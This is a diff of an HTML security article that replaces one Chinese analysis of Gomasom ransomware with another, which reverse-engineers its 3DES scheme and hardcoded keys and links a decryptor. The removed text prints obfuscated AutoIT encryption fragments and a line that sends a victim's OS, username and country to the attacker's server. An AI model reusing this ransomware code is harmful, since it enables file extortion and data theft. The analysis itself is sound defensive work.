@@ -400,85 +400,86 @@
         <div class="col-md-9" id="getWidth">
       <div class="article-wrap panel panel-default">
 
-                        <div id="contenttxt">
-           <p style="text-align: center;"><img width="650" height="471" alt="ksb_2016_eng_2-1024x742.jpg" data-original="http://image.3001.net/images/20170407/14915454461845.jpg!small" src="http://image.3001.net/images/20170407/14915454461845.jpg"></p>
-<noscript><img width="650" height="471" alt="ksb_2016_eng_2-1024x742.jpg" src="http://image.3001.net/images/20170407/14915454461845.jpg!small"></p></noscript>
-<h2><strong>前言</strong></h2>
-<p><b style="color: rgb(0, 176, 80);">最近，一种新型的勒索软件服务（RaaS）名为Gomasom，开始向外以400美元的价格售卖，这个恶意软件作者的名为Rainmaker。据Rainmaker所说，该程序套件提供一种低成本的勒索软件服务，它允许任何一个有犯罪意图的人发动高级的勒索软件攻击，并且它操作简单，成本低。</b></p>
-<p>同时，据Rainmaker介绍，Gomasom“创新”勒索软件服务市场，它具有自动检测功能：当付款已经完成，然后自动解密；感染USB驱动器，并通过网络感染其他计算机。 特别值得注意的是，“同情按钮”将提供给赋有同情心的犯罪分子解密特定受害者的文件。 为了演示这种新的勒索软件服务，Rainmaker创建了一个显示其功能的<a href="http://www.docdroid.net/vJV82cC/Gomasom-prints.pdf.html"><u>PDF</u></a>和<a href="https://krebsonsecurity.com/2017/03/ransomware-for-dummies-anyone-can-do-it/"><u>视频</u></a>。</p>
+                       <div id="contenttxt">
+                            <h2 style="text-align: center;"><img width="690" height="388" alt="title.jpg" data-original="http://image.3001.net/images/20170502/14937124491500.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></h2>
+<noscript><img width="690" height="388" alt="title.jpg" src="http://image.3001.net/images/20170502/14937124491500.jpg!small"></h2></noscript>
+<h2>前言</h2>
+<blockquote><p><font color="#00b050">最近，我们发现了一种新型的勒索软件，因其使用了gmail作为邮箱服务器，故被命名为Gomasom。当用户运行了该勒索软件时，用户的文件会被加密，加密后的文件后缀名为&#8221;.crypt&#8221;。加密完成后会在桌面生成文件&#8221;Crypted.txt&#8221;，提示用户通过恶意软件作者提供的网址支付100欧元赎金。</font></p>
+</blockquote>
+<p>通过谷歌搜索<a href="https://www.bleepingcomputer.com/news/security/gomasom-crypt-ransomware-decrypted/">Gomasom</a>勒索软件并且初步分析后发现，这是该家族的一个新变种，其加密方式与网上所描述的加密方式及症状并不完全相同，并且也不能通过网上的解密工具来解密加密后的文件。因此我决定逆向分析其算法并写出它的解密工具。</p>
 <h2><b>感染症状</b><br /></h2>
-<hr />
-<p>当文件被加密后，文件名称将被更改为.lock后缀的文件名。例如文件test.jpg可能会变成7B205C09B88C57ED8AB7C913263CCFBE296C8EA9938A.locked. 加密完成后会显示下面的锁屏图像：</p>
-<p style="text-align: center;"><img width="690" height="422" alt="hc3.png" data-original="http://image.3001.net/images/20170407/14915479244328.png!small" src="http://image.3001.net/images/20170407/14915479244328.png"></p>
-<noscript><img width="690" height="422" alt="hc3.png" src="http://image.3001.net/images/20170407/14915479244328.png!small"></p></noscript>
-<p>如上图所示，受害者被要求支付0.3比特币，并且勒索软件声称加密文件的算法使用了AES-256和RSA-2048。最后勒索软件作者将重要的事情说了3遍——发送0.3比特币到下面的地址！！！</p>
+<p>当恶意程序运行后，桌面会显示如下的勒索信息界面：</p>
+<p style="text-align: center;"><img width="300" height="500" alt="infected.png" data-original="http://image.3001.net/images/20170502/14937146267388.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="300" height="500" alt="infected.png" src="http://image.3001.net/images/20170502/14937146267388.png!small"></p></noscript>
+<p>同时，桌面和C盘根目录会生成一个txt文件“Crypted.txt”，如图：</p>
+<p style="text-align: center;"><img width="577" height="175" alt="crypted.png" data-original="http://image.3001.net/images/20170502/14937147478277.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="577" height="175" alt="crypted.png" src="http://image.3001.net/images/20170502/14937147478277.png!small"></p></noscript>
+<p>其中有一段字符串值得引人注意”S/N \dvwclF10U!)3p7“，初步猜测可能与密钥有关。</p>
+<p>文件被加密，文件后缀名被更改为“.crypt”，如图：</p>
+<p style="text-align: center;"><img width="609" height="358" alt="goat.png" data-original="http://image.3001.net/images/20170502/14937165846634.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="609" height="358" alt="goat.png" src="http://image.3001.net/images/20170502/14937165846634.png!small"></p></noscript>
+<p>我们打开了恶意作者提供的网站，并且<span style="color: rgb(51, 51, 51); font-size: 16px;">通过谷歌翻译，</span>发现如下信息：</p>
+<p style="text-align: center;"><img width="619" height="152" alt="enc_3des.png" data-original="http://image.3001.net/images/20170502/14937170352910.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="619" height="152" alt="enc_3des.png" src="http://image.3001.net/images/20170502/14937170352910.png!small"></p></noscript>
+<p>作者声称使用了3DES加密算法，并且“有许多的唯一的密钥被用来加密文件，想要解密是不可能的事情<span style="color: rgb(51, 51, 51); font-size: 16px;">”</span>。作者是否真的用了3DES算法加密文件？是否真的没办法恢复加密后的文件？带着疑问我们接下去通过逆向进行分析。</p>
 <h2><b>样本分析</b><br /></h2>
-<hr />
-<p><span style="color: rgb(0, 112, 192);"><b>通过进一步观察，该恶意软件是由AutoIT脚本编写并打包生成。通过反编译该AutoIT恶意程序，我们发现了其中的两个不同的版本。因此我们将分别分析它们。</b></span></p>
-<p><b><i>V1.0</i></b></p>
-<p>将自身拷贝到%appdata%\scvhost.exe，并且列出了待加密文件的类型：</p>
-<p style="text-align: center;"><img width="690" height="84" alt="Capture.PNG" data-original="http://image.3001.net/images/20170407/14915527393770.png!small" src="http://image.3001.net/images/20170407/14915527393770.png"></p>
-<noscript><img width="690" height="84" alt="Capture.PNG" src="http://image.3001.net/images/20170407/14915527393770.png!small"></p></noscript>
-<p>添加开机自启动：</p>
-<p style="text-align: center;"><img width="690" height="35" alt="Capture1.PNG" data-original="http://image.3001.net/images/20170407/14915531427589.png!small" src="http://image.3001.net/images/20170407/14915531427589.png></p>
-<noscript><img width="690" height="35" alt="Capture1.PNG" src="http://image.3001.net/images/20170407/14915531427589.png!small"></p></noscript>
-<p>待加密的目录：</p>
-<p style="text-align: center;"><img width="690" height="203" alt="Capture2.PNG" data-original="http://image.3001.net/images/20170407/14915529777405.png!small" src="http://image.3001.net/images/20170407/14915529777405.png"></p>
-<noscript><img width="690" height="203" alt="Capture2.PNG" src="http://image.3001.net/images/20170407/14915529777405.png!small"></p></noscript>
-<p>加密 加密硬盘，可移动硬盘，网络映射：</p>
-<p style="text-align: center;"><img width="690" height="229" alt="Capture3.PNG" data-original="http://image.3001.net/images/20170407/14915530405054.png!small" src="http://image.3001.net/images/20170407/14915530405054.png"></p>
-<noscript><img width="690" height="229" alt="Capture3.PNG" src="http://image.3001.net/images/20170407/14915530405054.png!small"></p></noscript>
-<p style="text-align: center;"><img width="690" height="176" alt="Capture0.PNG" data-original="http://image.3001.net/images/20170407/14915556984447.png!small" src="http://image.3001.net/images/20170407/14915556984447.png"></p>
-<noscript><img width="690" height="176" alt="Capture0.PNG" src="http://image.3001.net/images/20170407/14915556984447.png!small"></p></noscript>
-<p>经过混淆的加密文件算法：</p>
-<pre><code>&nbsp;$48E2CB6EE27D6950 &amp;= _48E2CBFBE08D6950 ( 0 , STRINGTRIMRIGHT ( $48E02B6BE07D6950 [ $48E02B6BE07D6950 [ 0 ] ] , STRINGLEN ( ".locked" ) ) , $48E21B4BE07D6950 )
-&nbsp;IF _48E2CB6BE0E16950 ( $48E30B6BE07D6950 , $48E2CB6EE27D6950 , $48E21B4BE07D6950 , $48E2CB6BC77D6950 ) AND NOT @ERROR THEN
-&nbsp;_48E2BB6BE0CD6950 ( $48E30B6BE07D6950 )<br /></code></pre>
-<p>用于加密的 Windows 库函数的初始化：</p>
-<pre><code>$48E24B6BE07D6950 = DLLCALL ( _48E2CB64B07D6950 ( ) , "bool" , "CryptCreateHash" , "handle" , _48E2CBDBE00D6950 ( ) , "uint" , $48E2CB63E07D6950 , "ptr" , 0 , "dword" , 0 , "handle*" , 0 )
-$48E24B6BE07D6950 = DLLCALL ( _48E2CB64B07D6950 ( ) , "bool" , "CryptHashData" , "handle" , $48E2CB6B407D6950 , "struct*" , $48E2CB6BE02D6950 , "dword" , DLLSTRUCTGETSIZE ( $48E2CB6BE02D6950 ) , "dword" , $48E2CB6BE0ED6950 )
-$48E24B6BE07D6950 = DLLCALL ( _48E2CB64B07D6950 ( ) , "bool" , "CryptDeriveKey" , "handle" , _48E2CBDBE00D6950 ( ) , "uint" , $48E2CB3BE07D6950 , "handle" , $48E2CB6B407D6950 , "dword" , $48E28B6BE07D6950 , "handle*" , 0 )
-$48E24B6BE07D6950 = DLLCALL ( _48E2CB64B07D6950 ( ) , "bool" , "CryptEncrypt" , "handle" , $48E27B6BE07D6950 , "handle" , 0 , "bool" , $48E2CD6BE07D6950 , "dword" , 0 , "ptr" , 0 , "dword*" , BINARYLEN ( $48E2BB6BE07D6950 ) , "dword" , 0 )<br /></code></pre>
-<p>经过对上面混淆过后的代码回溯跟踪和分析，函数 <i>_48E2CB6BE0E16950()</i> 用来加密文件， 变量<i>$48E2CB6BC77D6950</i>是加密文件函数的一个重要参数，继续向上找发现该变量的初始化代码：</p>
-<pre><code>&nbsp;GLOBAL CONST $48E2CB6BC77D6950 = 26128&nbsp;&nbsp;&nbsp;&nbsp;//0x6610&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CALG_AES_256<br /></code></pre>
-<p>正如恶意软件所描述的，采用了AES-256加密算法，但是我们没有看到RSA加密算法。</p>
-<p>生成随机数作为密钥：</p>
-<p style="text-align: center;"><img width="690" height="155" alt="Capture7.PNG" data-original="http://image.3001.net/images/20170407/14915560005061.png!small" src="http://image.3001.net/images/20170407/14915560005061.png"></p>
-<noscript><img width="690" height="155" alt="Capture7.PNG" src="http://image.3001.net/images/20170407/14915560005061.png!small"></p></noscript>
-<p><b><i>V2.0</i></b></p>
-<p><span style="color: rgb(0, 112, 192);"><b>新的版本在大的功能方面和核心算法方面并没有太大的变化，故不作重复列举，以下只列出与旧版本不同的部分。</b></span></p>
-<p>通过反编译我们发现，新版本的勒索软件Gomasom释放了一个INI文件作为恶意软件的配置文件。</p>
-<p>互斥体名，UAC，C2， 提示信息：</p>
-<p style="text-align: center;"><img width="681" height="219" alt="Capture6.PNG" data-original="http://image.3001.net/images/20170407/14915571324555.png!small" src="http://image.3001.net/images/20170407/14915571324555.png"></p>
-<noscript><img width="681" height="219" alt="Capture6.PNG" src="http://image.3001.net/images/20170407/14915571324555.png!small"></p></noscript>
-<p>待加密的目录：</p>
-<p style="text-align: center;"><img width="527" height="288" alt="Capture8.PNG" data-original="http://image.3001.net/images/20170407/14915573029728.png!small" src="http://image.3001.net/images/20170407/14915573029728.png"></p>
-<noscript><img width="527" height="288" alt="Capture8.PNG" src="http://image.3001.net/images/20170407/14915573029728.png!small"></p></noscript>
-<p>待加密的文件类型，释放的文件名，文件路径：</p>
-<p style="text-align: center;"><img width="690" height="82" alt="Capture9.PNG" data-original="http://image.3001.net/images/20170407/14915574465943.png!small" src="http://image.3001.net/images/20170407/14915574465943.png"></p>
-<noscript><img width="690" height="82" alt="Capture9.PNG" src="http://image.3001.net/images/20170407/14915574465943.png!small"></p></noscript>
-<p>由此我们可以看出，新版本的恶意程序摆脱了&#8221;硬编码&#8221;，通过设置配置文件来根据需要更改加密的具体细节。除此之外，我们在新版本中还发现一个有趣的地方：</p>
-<p style="text-align: center;"><img width="577" height="93" alt="Capture10.PNG" data-original="http://image.3001.net/images/20170407/149155766194.png!small" src="http://image.3001.net/images/20170407/149155766194.png"></p>
-<noscript><img width="577" height="93" alt="Capture10.PNG" src="http://image.3001.net/images/20170407/149155766194.png!small"></p></noscript>
-<p>处于好奇，我们Google此人&#8221;<i>Fabian&#8221;&nbsp; ，</i>我们发现此人很可能是 Fabian Wosar， 此人正是 Emsisoft 的反病毒研究员，继续搜索我们发现，此前Emsisoft 宣布可以解密勒索软件Gomasom。 但是从代码分析来看，新的版本加密文件的算法依然是AES-256，由此我们得出此勒索软件加密后的文件依旧可以解密而不需要交赎金。由此再来看这段代码，让人啼笑皆非。</p>
-<p>最后，恶意程序将上传受感染者计算机的相关信息到攻击者的服务器：</p>
-<pre><code>$C1 = _HL ( STRING ( $BU &amp; "?p=Insert&amp;osinfo=" &amp; _HI ( @OSVERSION ) &amp; "&amp;user=" &amp; _HI ( @USERNAME ) &amp; "&amp;country=" &amp; _HI ( $BX ) &amp; "&amp;locale=" &amp; _HI ( $BY ) &amp; "&amp;ucd=" &amp; _HI ( $BZ ) ) )<br /></code></pre>
-<p style="text-align: center;"><img width="690" height="241" alt="hc6.png" data-original="http://image.3001.net/images/20170407/14915586127412.png!small" src="http://image.3001.net/images/20170407/14915586127412.png"></p>
-<noscript><img width="690" height="241" alt="hc6.png" src="http://image.3001.net/images/20170407/14915586127412.png!small"></p></noscript>
-<h2><b></b></h2>
-<h2><b>勒索软件</b><b>管理</b><b>客户端</b></h2>
-<hr />
-<p>对于发动Gomasom勒索软件的攻击者，他们需要在网站上安装一个名为&#8221;网桥&#8221;的PHP脚本。 这些&#8221;网桥&#8221;将与勒索软件感染者连接，并存储有关受害者的加密密钥等信息。然后，攻击者在其计算机上运行名为Gomasom总部的管理客户端，该管理客户端将连接到每个配置的&#8221;网桥&#8221;，并将受害者数据下载到其管理控制台。 这个客户端允许攻击者看到谁被感染，哪些国家感染最多，甚至如果有同情心的攻击者想允许某人免费解密他们的文件，甚至提供怜悯的按钮。如图：</p>
-<p style="text-align: center;"><img width="633" height="447" alt="Gomasom-headquarters-application.png" data-original="http://image.3001.net/images/20170407/14915592303819.png!small" src="http://image.3001.net/images/20170407/14915592303819.png"></p>
-<noscript><img width="633" height="447" alt="Gomasom-headquarters-application.png" src="http://image.3001.net/images/20170407/14915592303819.png!small"></p></noscript>
-<p>Sha1:</p>
-<pre><code>9f906472665f6447dd24da499d6e0f7ebe119c82
-63e74c51b8e8a2f4e5b7f4c43fd7b3e816e1b367
-</code></pre>
+<p>我们发现样本使用了upx壳，脱完壳我们发现程序是用delphi语言写的，在动态分析之前，我使用分析软件PEID和 DeDe 来尝试获得一些有价值的信息，如图：</p>
+<p style="text-align: center;"><img width="424" height="283" alt="peid.png" data-original="http://image.3001.net/images/20170502/14937174822146.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="424" height="283" alt="peid.png" src="http://image.3001.net/images/20170502/14937174822146.png!small"></p></noscript>
+<p>通过PEID的Krypto Analyzer插件，我们发现使用了三种算法：base64, DES, MD5。</p>
+<p>通过DeDe 反编译，如图：</p>
+<p style="text-align: center;"><img width="617" height="373" alt="DeDe.png" data-original="http://image.3001.net/images/20170502/14937174024551.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="617" height="373" alt="DeDe.png" src="http://image.3001.net/images/20170502/14937174024551.png!small"></p></noscript>
+<p>通过上图可以发现，病毒样本使用了名为&#8221;TDCP&#8221;的一个封装好的类，功能主要是用来加密的类。通过谷歌搜索发现，这是一个开源的Dephi的加密算法的工程，名为<a href="http://wiki.freepascal.org/DCPcrypt">DCPcrypt</a>。粗略的看了下源码，就是一个加密算法的类，具体病毒样本的具体加密流程我们依然不清楚，因此接下来进行动态分析。</p>
+<p>判断文件&#8221;C:\crypted.txt&#8221;是否存在，若存在则退出程序。如图：</p>
+<p style="text-align: center;"><img width="690" height="181" alt="d1.png" data-original="http://image.3001.net/images/20170502/14937198723891.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="690" height="181" alt="d1.png" src="http://image.3001.net/images/20170502/14937198723891.png!small"></p></noscript>
+<h3>S/N生成算法<br /></h3>
+<p>_rand生成种子seed</p>
+<p style="text-align: center;"><img width="690" height="387" alt="rand.png" data-original="http://image.3001.net/images/20170502/149372001447.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="690" height="387" alt="rand.png" src="http://image.3001.net/images/20170502/149372001447.png!small"></p></noscript>
+<p style="text-align: center;">_srand()通过seed种子，进一步运算生成新的种子。如图：<img width="690" height="272" alt="srand.png" data-original="http://image.3001.net/images/20170502/14937201632083.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="690" height="272" alt="srand.png" src="http://image.3001.net/images/20170502/14937201632083.png!small"></p></noscript>
+<p>将以上的代码，转化为Python代码，如图：</p>
+<p style="text-align: center;"><img width="468" height="148" alt="rand_srand.png" data-original="http://image.3001.net/images/20170502/14937202704681.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="468" height="148" alt="rand_srand.png" src="http://image.3001.net/images/20170502/14937202704681.png!small"></p></noscript>
+<p>利用种子seedl，通过映射表获得随机字符，如图：</p>
+<p style="text-align: center;"><img width="690" height="213" alt="gen_sn_od.png" data-original="http://image.3001.net/images/20170502/1493720725883.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="690" height="213" alt="gen_sn_od.png" src="http://image.3001.net/images/20170502/1493720725883.png!small"></p></noscript>
+<p>转化为Python代码，如图：</p>
+<p style="text-align: center;"><img width="674" height="216" alt="gen_sn.png" data-original="http://image.3001.net/images/20170502/14937207948603.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="674" height="216" alt="gen_sn.png" src="http://image.3001.net/images/20170502/14937207948603.png!small"></p></noscript>
+<h3>待加密文件后缀</h3>
+<p>初始化后缀名列表，如图：</p>
+<p style="text-align: center;"><img width="657" height="169" alt="init_ext_array_od.png" data-original="http://image.3001.net/images/20170502/14937212365274.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="657" height="169" alt="init_ext_array_od.png" src="http://image.3001.net/images/20170502/14937212365274.png!small"></p></noscript>
+<p>通过Python代码重新整理后，待加密的文件后缀名名列表如图：</p>
+<p style="text-align: center;"><img width="644" height="68" alt="ext.png" data-original="http://image.3001.net/images/20170502/14937213253519.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="644" height="68" alt="ext.png" src="http://image.3001.net/images/20170502/14937213253519.png!small"></p></noscript>
+<p>从上面的拓展名加密列表中发现，不仅用户的文档，数据等会被加密，用户的程序源码也会被加密。看来对程序员有着深深的恶意！</p>
+<h3>加密算法</h3>
+<p>初始密钥一共有10组，全部硬编码在程序中，S/N的最后一位数字，对应取出一组初始密钥（长度为0&#215;18）</p>
+<p style="text-align: center;"><img width="588" height="157" alt="md5_key.PNG" data-original="http://image.3001.net/images/20170502/14937229089778.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="588" height="157" alt="md5_key.PNG" src="http://image.3001.net/images/20170502/14937229089778.png!small"></p></noscript>
+<p>十组硬编码的密钥：</p>
+<p></p>
+<p>通过MD5加密后生成新的密钥，长度为16字节，将生成的密钥作为新的密钥，用来加密文件。根据密钥长度，汇编代码，和其他信息我们得出，加密算法为<i>3DES。</i>更确切的说算法是 <i>3DES-128。</i></p>
+<p>因为只使用了一种加密算法，并且是对称加密算法，我们可以编写代码进行解密。如图：</p>
+<p style="text-align: center;"><img width="536" height="176" alt="decrypt_file.png" data-original="http://image.3001.net/images/20170502/14937228539139.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="536" height="176" alt="decrypt_file.png" src="http://image.3001.net/images/20170502/14937228539139.png!small"></p></noscript>
+<p><span style="color: rgb(51, 51, 51); font-size: 16px;">编写解密代码，并运行，如图：</span></p>
+<p style="text-align: center;"><img width="666" height="168" alt="decrypt_file_cmd.png" data-original="http://image.3001.net/images/20170502/14937233465243.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="666" height="168" alt="decrypt_file_cmd.png" src="http://image.3001.net/images/20170502/14937233465243.png!small"></p></noscript>
+<p>运行结果，如图：</p>
+<p style="text-align: center;"><img width="600" height="387" alt="decrypd.PNG" data-original="http://image.3001.net/images/20170502/14937235041461.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
+<noscript><img width="600" height="387" alt="decrypd.PNG" src="http://image.3001.net/images/20170502/14937235041461.png!small"></p></noscript>
+<p>样本：</p>
+<blockquote><p>f77e7569b2b2c54c006821b02ef76cd5f3826a37</p>
+</blockquote>
+<p>解密器代码下载地址：<a href="https://github.com/Voraka/Gomasom_Decryptor">https://github.com/Voraka/Gomasom_Decryptor</a></p>
 <h2><b>总结</b></h2>
-<hr />
-<p>手动分析这种基于AutoIT勒索程序样本的难度并不大，但是通过强的代码混淆技术，反调试，反模拟器等技术的运用，的确给杀毒软件的识别和查杀带来了难度。同时，勒索软件出售服务的出现，加大了网络攻击的可能性，并降低了非专业技术人员实施网络攻击的难度，这值得我们警惕。</p>
-<p><span style="font-size: 12pt;"><b style="color: rgb(159, 163, 168);">&nbsp;*本文作者：Voraka，转载请注明来自FreeBuf.COM</b></span></p>
+<p>该勒索软件的确使用了128位的3DES加密算法，但并不是不可解密的，因为其密钥保存在本地，甚至就保存在程序本身，而且密钥只有10组，即使用户删除了保存着密钥编号的文件“crypted.txt”，然而也可以遍历这些密钥来逐一尝试解密。因此勒索软件设计存在较大缺陷，也正是这个缺陷帮助我们恢复了被加密的文件。看似存在多个”加密芯片“，但本身设计就是不安全的，有缺陷的，被加密后仍然可能不安全。</p>
+<p><font color="#ef4747"><b>* 原创作者：Voraka，本文属FreeBuf原创奖励计划，未经许可禁止转载</b></font><b><font color="#00b050">&nbsp;</font></b></p>
                     </div>
       
 
